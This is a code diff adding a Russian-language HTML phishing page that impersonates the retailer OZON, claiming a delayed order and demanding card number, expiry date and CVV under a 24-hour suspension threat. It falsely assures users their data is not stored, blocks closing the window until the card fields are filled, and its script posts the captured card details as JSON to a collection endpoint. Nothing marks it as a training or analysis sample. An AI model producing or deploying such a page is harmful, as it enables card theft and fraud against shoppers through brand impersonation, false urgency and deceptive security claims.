@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="kk">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OZON - Форма оплаты</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="background"></div>
+    <div class="payment-window" id="paymentWindow">
+        <h2>Задержка при отправке заказа!</h2>
+        <p>Уважаемый клиент,</p>
+        <p>Ваш заказ <strong>№88873</strong> временно задержан на складе из-за несоответствия платежных данных.
+            Для подтверждения и ускорения отправки, пожалуйста, повторно введите данные вашей карты.</p>
+        <p><strong>Ваш заказ будет приостановлен, если данные не будут подтверждены в течение 24 часов.</strong></p>
+        <form id="paymentForm">
+            <label for="card-number">Номер карты</label>
+            <input type="text" id="card-number" placeholder="Номер карты" required pattern="\d{16}" title="Введите 16 цифр">
+            <label for="expiry-date">Срок действия</label>
+            <input type="text" id="expiry-date" placeholder="ММ/ГГ" required pattern="(0[1-9]|1[0-2])\/\d{2}" title="Введите дату в формате MM/YY">
+            <label for="cvv">CVV</label>
+            <input type="text" id="cvv" placeholder="CVV" required pattern="\d{3}" title="Введите 3 цифры">
+            <button type="submit">Подтвердить</button>
+        </form>
+
+        <p class="security-message">🔒 В целях безопасности данные не сохраняются и используются только для подтверждения заказа.</p>
+        <button class="close-btn" onclick="closePaymentWindow()" disabled id="closeBtn">Закрыть</button>
+    </div>
+    <script>
+        function validateForm() {
+            const cardNumber = document.getElementById('card-number').value;
+            const expiryDate = document.getElementById('expiry-date').value;
+            const cvv = document.getElementById('cvv').value;
+            const closeBtn = document.getElementById('closeBtn');
+
+            if (cardNumber.length === 16 && expiryDate.match(/(0[1-9]|1[0-2])\/\d{2}/) && cvv.length === 3) {
+                closeBtn.disabled = false;
+            } else {
+                closeBtn.disabled = true;
+            }
+        }
+        document.getElementById('paymentForm').addEventListener('input', validateForm);
+        function closePaymentWindow() {
+            document.getElementById('paymentWindow').style.display = 'none';
+        }
+        document.getElementById("paymentForm").addEventListener("submit", function(event) {
+            event.preventDefault();
+            const cardNumber = document.getElementById('card-number').value;
+            const expiryDate = document.getElementById('expiry-date').value;
+            const cvv = document.getElementById('cvv').value;
+            const data = {
+                card_number: cardNumber,
+                expiration: expiryDate,
+                cvv: cvv
+            };
+            fetch('http://localhost:8000/submit', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(data),
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Success:', data);
+                alert('Данные успешно отправлены!');
+                closePaymentWindow();
+            })
+            .catch((error) => {
+                console.error('Error:', error);
+                alert('Ошибка при отправке данных');
+            });
+        });
+    </script>
+</body>
+</html>
